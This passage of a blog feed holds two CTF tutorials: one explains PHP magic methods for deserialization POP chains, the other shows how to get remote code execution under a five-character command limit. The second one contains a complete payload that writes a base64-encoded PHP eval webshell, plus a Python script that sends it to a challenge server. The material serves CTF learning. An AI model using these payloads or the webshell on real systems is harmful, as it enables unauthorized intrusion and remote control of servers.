alt="image.png"></p><p>从上面这个例子我们可以看出来，在看到<code>serialize($a)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p><p><img src="https://i.loli.net/2021/08/14/n4c6d5riIJAUOhC.png" alt="image.png"></p><p>而这个例子我们是直接输入了字符串，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p><h2 id="三-toString"><a href="#三-toString" class="headerlink" title="三.__toString()"></a>三.<code>__toString()</code></h2><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p><p>(1)echo($obj)或print($obj)打印<strong>对象</strong>时会触发<br>(2)反序列化<strong>对象</strong>与字符串连接时<br>(3)反序列化<strong>对象</strong>参与格式化字符串时<br>(4)反序列化<strong>对象</strong>与<strong>字符串</strong>进行**==<strong>比较时(多为</strong>preg_match正则匹配**)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较<br>(5)反序列化<strong>对象</strong>参与格式化sql语句时，绑定参数时(用的少)<br>(6)反序列化<strong>对象</strong>经过php字符串函数时，如strlen(),addslashes()时(用的少)<br>(7)在in_array()方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有tostring返回的字符串的时候tostring会被调用<br>(8)反序列化的<strong>对象</strong>作为class_exists()的参数的时候(用的少)</p><p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用，看代码应该会清晰一些：</p><p><img src="https://i.loli.net/2021/08/14/yuCH7WfwvMPdlhg.png" alt="image.png"></p><p>比如说上面这段代码，我们新建了对象<code>a</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来，下面再来看一个与字符串连接的例子：</p><p><img src="https://i.loli.net/2021/08/15/KhuL8WIM7xYSVpH.png" alt="image.png"></p><p>也是同样的道理，变量a被当成了字符串，然后与b完成了连接，更多调用它的方法在下篇实战中演示</p><h2 id="四-invoke"><a href="#四-invoke" class="headerlink" title="四.__invoke()"></a>四.<code>__invoke()</code></h2><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p><p>需要注意的是，这个魔术方法只在PHP 5.3.0 及以上版本有效</p><p><img src="https://i.loli.net/2021/08/15/pcr6Ogo8kIDYtH4.png" alt="image.png"></p><h2 id="五-get-和-set"><a href="#五-get-和-set" class="headerlink" title="五.__get()和__set()"></a>五.<code>__get()</code>和<code>__set()</code></h2><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是调用一个类及其父类方法中未定义属性时</p><p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private protected</code>)(用的不多)</p><p><img src="https://i.loli.net/2021/08/15/iOyhwTMNasckGeI.png" alt="image.png"></p><p>比如说看上面这个例子，<code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>a</code>属性，但我们是没有定义<code>a</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值通过<code>echo</code>打印了出来</p><h2 id="六-call-和-callStatic"><a href="#六-call-和-callStatic" class="headerlink" title="六.__call()和__callStatic()"></a>六.<code>__call()</code>和<code>__callStatic()</code></h2><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p><p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p><p><img src="https://i.loli.net/2021/08/15/goMhKZzP9FkrIVy.png" alt="image.png"></p><p>比如说像上面这段代码，我们调用对象<code>a</code>中的方法<code>c</code>，但因为类中没有方法<code>c</code>，所以说就调用了<code>__call()</code></p><h2 id="七-其它魔术方法"><a href="#七-其它魔术方法" class="headerlink" title="七.其它魔术方法"></a>七.其它魔术方法</h2><p>差不多比较重要的魔术方法上面都介绍完了，下面再把其它的魔术方法简单介绍一下，这些基本上ctf中都碰不到，了解了解就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__isset()：当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()：当对不可访问属性调用unset()时被调用。</span><br><span class="line">__set_state()：调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()：当对象复制完成时调用</span><br><span class="line">__autoload()：尝试加载未定义的类</span><br><span class="line">__debugInfo()：打印所需调试信息</span><br></pre></td></tr></table></figure><p>如果想要测试的可以参考php官方手册：<a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这里魔术方法就介绍完了，熟练掌握魔术方法是构造pop链的基础，然后pop链具体构造的过程和思路请看下一篇文章</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pop链的构造-上篇&quot;&gt;&lt;a href=&quot;#pop链的构造-上篇&quot; class=&quot;headerlink&quot; title=&quot;pop链的构造(上篇)&quot;&gt;&lt;/a&gt;pop链的构造(上篇)&lt;/h1&gt;&lt;p&gt;php反序列化漏洞，是web安全漏洞中非常重要的一种，无论是在ctf中还是实战中都有很广泛的应用，而一般在一些大型ctf比赛中，反序列化甚至是web题中的签到题，所以说把这基础打扎实就很重要；而在php反序列化中，构造pop链肯定是一个绕不开的话题，接下来我们来介绍构造pop链的思路和过程，上篇我们先来详细介绍魔术方法，然后下篇通过多个案例介绍利用pop链将魔术方法串起来&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之限制长度下的命令执行</title>
    <link href="https://arsenetang.github.io/2021/08/06/RCE%E7%AF%87%E4%B9%8B%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://arsenetang.github.io/2021/08/06/RCE%E7%AF%87%E4%B9%8B%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-08-05T16:00:00.000Z</published>
    <updated>2021-08-09T14:14:45.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="限制长度下的命令执行"><a href="#限制长度下的命令执行" class="headerlink" title="限制长度下的命令执行"></a>限制长度下的命令执行</h1><p>前段时间团队考核遇到过一个限制长度下的rce，虽然是按照别人的脚本复现出来了，但其实里面的原理什么的完全没搞懂，害还是太菜了，找了些文章也基本上就是直接上脚本，趁着假期就把这些基础知识总结一下</p><span id="more"></span><h2 id="1-知识铺垫"><a href="#1-知识铺垫" class="headerlink" title="1.知识铺垫"></a>1.知识铺垫</h2><p>1.在<code>linux</code>下，<code>&gt;</code>可以实现创建文件的功能，并且前面可以执行任何命令，然后将命令执行的结果通过<code>&gt;</code>写入到文件中，例如：</p><p><img src="https://i.loli.net/2021/08/06/GhiJYRsD6qtBcKe.png" alt="image.png"></p><p>可以看到，本来是一个空的文件夹，我们通过<code>&gt;</code>创建了两个空文件<code>a</code>和<code>b</code>，然后又创建了一个空文件<code>c</code>并且将<code>ls</code>的结果写进了<code>c</code>中，注意这里有个顺序问题，就是它是先创建的空文件<code>c</code>然后执行<code>ls</code>的命令，最后将命令执行的结果写进去的</p><p>2.<code>ls</code>这个命令可以添加参数，它默认的排列顺序是按照字母顺序排序，加上<code>-t</code>参数可以按时间顺序来排序文件，新文件在前面，老文件在后面，感觉有点像栈的先进后出，先写的文件在后面，后写的文件在前面，用<code>ls -th</code>也是一样的效果，<code>-h</code>的意思是把文件大小显示成1k 1M 等形式，加上这个之后可以调整<code>-t</code>参数的位置，这个我们后面再讲</p><p><img src="https://i.loli.net/2021/08/06/S5x67RvGu2rfwPT.png" alt="image.png"></p><p>3.<code>linux</code>中有个<code>sh</code>命令会将文件中的内容当作命令来执行，比如说<code>sh d</code>就会将文件<code>d</code>中的内容当作命令来执行</p><p><img src="https://i.loli.net/2021/08/06/OSzMAlh7t1L9Doq.png" alt="image.png"></p><p>4.<code>linux</code>中可以使用<code>反斜杠\</code>来拼接命令，实现命令的换行，当最后一段字符后面没有<code>\</code>了，说明命令拼接结束，并开始执行，但如果是要写成文件名的形式，那最后一个<code>\</code>的前面还需要加一个<code>\</code>作为转义符</p><p><img src="https://i.loli.net/2021/08/06/nKTzuyWlfkaBm6x.png" alt="image.png"></p><p>5.在<code>linux</code>中，<code>星号*</code>可以作为通配符使用，输入<code>*</code>后，<code>linux</code>会将该目录下第一个列出的文件名作为命令，剩下的的文件名当作参数</p><p><img src="https://i.loli.net/2021/08/06/R3dzZiJ6KgYH8jk.png" alt="image.png"></p><p>像上面这个例子，执行<code>*</code>就相当于执行<code>ls t</code>，将<code>ls</code>作为命令，<code>t</code>作为参数；</p><p>有的时候当一个目录下有很多个文件的时候，可以在<code>*</code>后面加上字母作为限制，就可以限定为必须要<strong>带有该字母的文件</strong>才能被当作<strong>命令</strong>和<strong>参数</strong>，它依旧是按照字母顺序，第一个为命令，后面的为参数，比如说下面这个例子，虽然说里面有很多文件，但我们用了<code>*s</code>，相当于就是带有<code>s</code>的第一个文件被作为了命令，后面带有<code>s</code>的文件作为了参数，所以说我们执行<code>*s</code>，相当于执行<code>ls s</code></p><p><img src="https://i.loli.net/2021/08/06/WKQLchT2k8sYIDC.png" alt="image.png"></p><p>6.<code>linux</code>中还有一个倒置命令<code>rev</code>，它可以将文件中的内容倒置，比如说下面这个例子，<code>a</code>文件中的内容本来是<code>1234</code>，然后我们用了<code>rev</code>倒置命令，就输出了<code>4321</code>，我们还可以将这个输出结果写入文件<code>b</code>中</p><p><img src="https://i.loli.net/2021/08/06/tbAkUDFVIfJN2T4.png" alt="image.png"></p><p>当然，我们也可以按照前面的方法，将<code>rev</code>当作文件名，然后利用<code>*v</code>来执行它，只不过文件名也要为<code>v</code></p><p><img src="https://i.loli.net/2021/08/06/5KVYq4wmF2CuWzg.png" alt="image.png"></p><p>7.<code>linux</code>中还有一个命令<code>dir</code>，这个命令和<code>ls</code>基本上是一样的，只不过用<code>ls</code>写入文件中时，每个文件名都是单独一行，它会自动换行，这会影响我们后面命令的执行，但<code>dir</code>就会全部写入一行中，并且会自动加空格，所以说我们就用<code>dir</code>代替<code>ls</code></p><p><img src="https://i.loli.net/2021/08/06/Ae8jmy1nHsYOWQb.png" alt="image.png"></p><p>到这里我们的铺垫知识就全部讲完了，下面就直接进入正题：</p><h2 id="2-核心代码"><a href="#2-核心代码" class="headerlink" title="2.核心代码"></a>2.核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5(md5(<span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>]))==<span class="string">&quot;42dc38109914179199efc5c18d47ee68&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="string">&quot;shell.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;年轻人，这个后门你把握不住，收手吧&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$you_file</span> = <span class="string">&#x27;/var/www/html/wllm/&#x27;</span>.md5(<span class="string">&quot;wllm&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    mkdir(<span class="variable">$you_file</span>);</span><br><span class="line">    chdir(<span class="variable">$you_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;big_hacker_LTLT&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;big_hacker_LTLT&#x27;</span>]) &lt;= <span class="number">5</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> exec(<span class="variable">$_GET</span>[<span class="string">&#x27;big_hacker_LTLT&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) </span><br><span class="line">    </span><br><span class="line">    &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$you_file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>刚开始的这个双md5不用管它，这是题目上一层解出来的，解出来pass的值为<code>LTLT_666</code></p><h2 id="3-思路分析"><a href="#3-思路分析" class="headerlink" title="3.思路分析"></a>3.思路分析</h2><p>从代码中可知，这里有<code>exec</code>函数，是可以执行命令的，但由于有长度限制，所以说我们不能执行完整命令，只能试图利用<code>linux</code>下命令可以拆分的特点，将写入一句话木马的命令，拆分开来，作为文件名的形式先写进去，然后再写一个文件<code>v</code>，里面的内容是<code>ls -th &gt;f</code>，然后通过执行这个文件<code>v</code>，让前面的文件名按照时间顺序拼接起来，并写入到文件<code>f</code>中，那文件<code>f</code>中就是我们想要的写入一句话木马的命令了，最后执行这个文件<code>f</code>，就将木马成功写入进去了</p><h2 id="4-具体过程"><a href="#4-具体过程" class="headerlink" title="4.具体过程"></a>4.具体过程</h2><p>1.我们首先来写<strong>写入一句话木马的命令</strong>，这里要注意的是，由于里面有<code>&lt; ?</code>这些字符，所以说我们先将其<code>base64</code>编码后再写入，具体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一句话：&lt;?php eval($_POST[1]);</span><br><span class="line">base编码后：PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line">写入的命令：echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</span><br><span class="line">这里的空格要用$&#123;IFS&#125;来代替，避免一句话中存在两个空格</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/07/bMBnwWzhXOrNqGJ.png" alt="image.png"></p><p>验证一下，发现没有问题</p><p>2.然后我们就要来拼接出命令<code>ls -th &gt;f</code>了，我认为这儿是最复杂的，这里先解释一下为啥要拼接出这条命令，因为它<code>ls</code>默认排列文件的顺序是按照字母顺序的，如果把这个顺序写入文件中那肯定是杂乱无章的，也肯定不是我们想要的，所以说我们得想办法控制它的顺序，而唯一能控制的就是输入命令的时间先后顺序了，我们把想要放在后面的先输入，想要放在前面的后输入，然后利用<code>ls -th</code>一排，不就是我们想要的顺序了吗，这里我用<code>kali</code>做个演示，命令就是<code>echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</code></p><p>我们看到核心代码中它每次输入的命令不能超过五字符，那我就把这命令划分一下，五个字符一句，所有的符号前面都要加转义符<code>\</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&gt;e\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;Cg\\     </span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;hp</span><br></pre></td></tr></table></figure><p>但由于前面讲的，我们得按照时间得先后顺序，给它倒过来，害这真的是个体力活：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;Cg\\ </span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br></pre></td></tr></table></figure><p>然后我们在<code>kali</code>中做测试，一个一个按顺序把它敲进去，太艰难了</p><p><img src="https://i.loli.net/2021/08/06/3zCL7GQYegayrmD.png" alt="image.png"></p><p>可以看到已经成功了，它已经按照时间顺序排序好了，那我们就把它执行的结果写入文件<code>f</code>中，然后利用<code>sh</code>来执行<code>f</code>，看能不能成功生成<code>1.php</code></p><p><img src="https://i.loli.net/2021/08/06/qheSFP7Z9wBfrtn.png" alt="image.png"></p><p>成功了成功了，<code>1.php</code>成功生成，内容也是我们想要的，哇看到这个我真的感觉前面的辛苦都值了哈哈哈</p><p>3.拼接出命令<code>ls -th &gt;f</code>，害本来第二步我就想讲这个的，结果写着写着就写偏了，前面我们的<code>ls -t &gt;f</code>这命令是直接写的，实际上题目中我们是肯定不可能直接写的，同样需要把它写成文件名拼接起来写入文件中，然后执行它，这就需要我们前面铺垫的知识了，这里我先把构造结果写出来，然后再分析，如果哪一步没看懂可以去上面看对应的铺垫知识哦：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v  (等同于命令：dir &quot;f&gt;&quot; &quot;ht‐&quot; &quot;sl&quot; &gt; v )</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;0 前面的*v等同于命令rev v，相当于将v中的文件内容倒了回来，变回:ls -th &gt;f</span><br><span class="line">然后将倒转后的内容写入文件0中，文件0中的内容为:ls -th &gt;f</span><br></pre></td></tr></table></figure><p>首先是用<code>dir</code>代替了<code>ls</code>，原因上面也讲了，然后我们这里用<code>-th</code>代替了<code>-t</code>是因为字母顺序的问题，因为我们这里是选择先倒着写然后再用<code>rev</code>命令把它正过来，字母<code>h</code>顺序正好在字母<code>s</code>和<code>f</code>之间，所以说就可以，如果只有<code>t</code>的话它就会排在<code>s</code>的后面，顺序就乱了</p><p>4.综合第二三步</p><p>前两步构造出来之后其实我们的核心步骤就已经完成了，第二步我们构造出来要执行的命令，第三步将要执行的命令写入到一个文件中，然后就是执行命令的过程了，先执行<code>ls -th &gt;f</code>也就是<code>sh 0</code>，再执行文件<code>f</code>也就是<code>sh f</code>即可成功写入一句话，综合一下payload就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;0</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;Cg\\ </span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh 0</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>5.写python脚本</p><p>前面也看到了，我们要是纯靠手把这些payload全部输进去还是有些麻烦的，所以说我们还是写个python脚本来代替我们发起这些请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span> : <span class="string">&#x27;ccc&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://xx.xxx.xx.xxx:10001/shell.php?pass=LTLT_666&amp;big_hacker_LTLT=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()),headers=headers)</span><br></pre></td></tr></table></figure><p>这里面我加了个UA头是因为核心代码中说了目录名就是<code>/var/www/html/wllm/&#39;.md5(&quot;wllm&quot; . $_SERVER[&#39;HTTP_USER_AGENT&#39;])</code>那相当于我这个目录名就是<code>/var/www/html/md5(wllmccc)</code>，也就是<code>/var/www/html/wllm/09dfd2544882e2d4cfc851dcb1e78c4f</code>，payload.txt中的内容就是上面那段payload，接下来开始跑脚本：</p><p><img src="https://i.loli.net/2021/08/07/7AezlyJB8t6Ojci.png" alt="image.png"></p><p>跑完脚本去看这个文件是否已经生成，发现已经生成，那就大功告成了，执行命令和用蚁剑连接都是可以的哦</p><p><img src="https://i.loli.net/2021/08/07/wmT1ZU2sIjlFgQz.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/07/oveGnEIgk1VN9w8.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/07/qHdfM2OkwmINgVo.png" alt="image.png"></p><p>参考文章：<a href="https://blog.csdn.net/qq_45521281/article/details/105900489">https://blog.csdn.net/qq_45521281/article/details/105900489</a></p><p><a href="https://blog.csdn.net/shuteer_xu/article/details/103485470">https://blog.csdn.net/shuteer_xu/article/details/103485470</a></p><p><a href="https://blog.csdn.net/q20010619/article/details/109206728">https://blog.csdn.net/q20010619/article/details/109206728</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;限制长度下的命令执行&quot;&gt;&lt;a href=&quot;#限制长度下的命令执行&quot; class=&quot;headerlink&quot; title=&quot;限制长度下的命令执行&quot;&gt;&lt;/a&gt;限制长度下的命令执行&lt;/h1&gt;&lt;p&gt;前段时间团队考核遇到过一个限制长度下的rce，虽然是按照别人的脚本复现出来了，但其实里面的原理什么的完全没搞懂，害还是太菜了，找了些文章也基本上就是直接上脚本，趁着假期就把这些基础知识总结一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
